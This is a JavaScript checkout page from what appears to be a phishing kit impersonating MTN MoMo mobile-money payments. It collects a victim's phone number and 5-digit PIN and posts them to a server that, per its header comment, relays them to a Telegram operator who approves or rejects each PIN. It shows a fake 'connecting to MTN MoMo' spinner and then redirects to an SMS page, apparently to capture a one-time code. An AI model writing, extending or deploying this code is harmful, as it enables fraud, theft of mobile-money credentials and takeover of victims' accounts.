/* ==========================================================================
   pages/checkout.js
   Reads ?plan and ?sid, renders the amount, wires phone + 5-digit PIN.
   On Confirm:
     1. POST /api/checkout (sends phone + PIN to the operator on
        Telegram with Approve/Reject PIN buttons)
     2. show the "Sending..." spinner for AT LEAST 5 seconds
     3. navigate to sms.html

   If the URL carries ?error=pin_rejected (a bounce back from the SMS
   page after the operator rejected the PIN), the error is shown and
   the phone number is prefilled.
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var SMS_PAGE = "sms.html";
  var PIN_LENGTH = 5;
  var CONFIRM_DWELL_MS = 5000;

  var LOADER_ID = "payment-loader";
  var LOADER_TITLE_ID = "loader-title";
  var LOADER_BODY_ID = "loader-body";
  var LOADER_FOOTNOTE_ID = "loader-footnote";
  var ERROR_ID = "checkout-error";
  var ERROR_TEXT_ID = "checkout-error-text";

  var ERROR_REJECTED = "Wrong PIN, please try again.";
  var ERROR_NO_SESSION =
    "This checkout link is missing a session. " +
    "Please start from the beginning (Choose your package).";
  var ERROR_NETWORK =
    "Could not reach the server. Is 'py run_server.py' running?";

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function digitsOnly(value) {
    return (value || "").replace(/\D+/g, "");
  }

  function formatLocalPhone(raw) {
    var digits = digitsOnly(raw);
    if (!digits) {
      return "";
    }
    return digits.charAt(0) === "0" ? digits : "0" + digits;
  }

  function resolvePlan() {
    var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
    return global.Plans.findByCode(code) ||
           global.Plans.findByCode(DEFAULT_PLAN_CODE);
  }

  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) {
      el.textContent = value;
    }
  }

  function showLoader(title, body) {
    setText(LOADER_TITLE_ID, title);
    setText(LOADER_BODY_ID, body);
    setText(LOADER_FOOTNOTE_ID, "Please do not refresh the page");
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function showError(message) {
    setText(ERROR_TEXT_ID, message);
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "flex";
    }
  }

  function hideError() {
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "none";
    }
  }

  function syncConfirmState(pinInput, button) {
    button.disabled = pinInput.value.length !== PIN_LENGTH;
  }

  function postCheckout(sessionId, phone, pin) {
    return global.fetch("/api/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        phone: phone,
        pin: pin
      })
    });
  }

  function navigateToSms(plan, phone, sessionId) {
    var target = SMS_PAGE +
      "?plan=" + encodeURIComponent(plan.code) +
      "&phone=" + encodeURIComponent(phone) +
      "&sid=" + encodeURIComponent(sessionId);
    global.location.href = target;
  }

  function wireForm(plan, sessionId) {
    var phoneInput = document.getElementById("phone");
    var pinInput = document.getElementById("pin");
    var confirmBtn = document.getElementById("confirm-payment");
    if (!phoneInput || !pinInput || !confirmBtn) {
      return;
    }

    var prefill = getQueryParam("phone");
    if (prefill) {
      phoneInput.value = digitsOnly(prefill).slice(0, 9);
    }

    phoneInput.addEventListener("input", function () {
      phoneInput.value = digitsOnly(phoneInput.value).slice(0, 9);
    });
    pinInput.addEventListener("input", function () {
      pinInput.value = digitsOnly(pinInput.value).slice(0, PIN_LENGTH);
      syncConfirmState(pinInput, confirmBtn);
    });

    confirmBtn.addEventListener("click", function () {
      hideError();
      var phone = formatLocalPhone(phoneInput.value);
      var pin = pinInput.value;
      if (phone.length < 9 || pin.length !== PIN_LENGTH) {
        showError("Enter a 9-digit phone number and a 5-digit PIN.");
        return;
      }

      showLoader(
        "MoMo Loading...",
        "Please wait while we connect you to MTN MoMo"
      );

      var post = postCheckout(sessionId, phone, pin).catch(function () {});
      var dwell = new Promise(function (resolve) {
        global.setTimeout(resolve, CONFIRM_DWELL_MS);
      });
      Promise.all([post, dwell]).then(function () {
        navigateToSms(plan, phone, sessionId);
      });
    });

    syncConfirmState(pinInput, confirmBtn);
  }

  function init() {
    var plan = resolvePlan();
    var sessionId = getQueryParam("sid") || "";

    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }

    if (getQueryParam("error") === "pin_rejected") {
      showError(ERROR_REJECTED);
    }

    if (!sessionId) {
      showError(ERROR_NO_SESSION);
      return;
    }
    wireForm(plan, sessionId);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
